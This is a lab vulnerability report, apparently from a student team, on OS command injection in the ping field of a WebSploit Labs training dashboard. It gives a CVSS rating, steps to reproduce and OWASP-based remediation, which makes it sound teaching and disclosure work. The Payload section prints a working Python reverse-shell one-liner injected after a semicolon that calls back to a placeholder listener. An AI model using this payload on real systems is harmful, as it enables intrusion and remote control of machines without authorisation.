**CVE-ID**: EDU-SHELLINJECT-2026-T04-001  
**Title**:  Remote Command Execution through OS Command Injection
**Affected Lab**:   Shell Inject (10.6.6.34)
**Component**:   `/` (WebSploit Labs NetOps Connectivity Dashboard)
**Severity**:  Critical
**CVSS Vector**:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
**CVSS Score**:  10.0
**Description**:  The `ping` functionality is unfiltered. Calling the `ping` command concatenates the command with the textbox input, resulting in possible command injection to the operating system.

**Proof of Concept**:

<img width="940" height="402" alt="Image" src="https://github.com/user-attachments/assets/eebdfd77-8c35-4ecc-a3fb-a3e9991b98cd" />

<img width="723" height="263" alt="Image" src="https://github.com/user-attachments/assets/0322736e-3cde-4357-8aaf-a5fa669b0353" />

**Payload**:
```
8.8.8.8;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<listener IP>",<listener port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
**Steps to Reproduce**:
1. Navigate to: http://10.6.6.34:5000/
2. In the "Enter Hostname or IP” text box, insert a random IP, followed by a semicolon, then the arbitrary shell command.
3. (Optional) Put a reverse shell script as a command, and setup a listener on your attacker machine
4. Click “Ping host” and it will run the arbitrary command.

**Remediation**:
1. Avoid calling OS command directly
2. If OS command calling is unavoidable, escape, restrict, and filter the input as necessary. [Guide](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html#primary-defenses)


**Discovered By**:  Team 4
**Date**:  02/02/2026
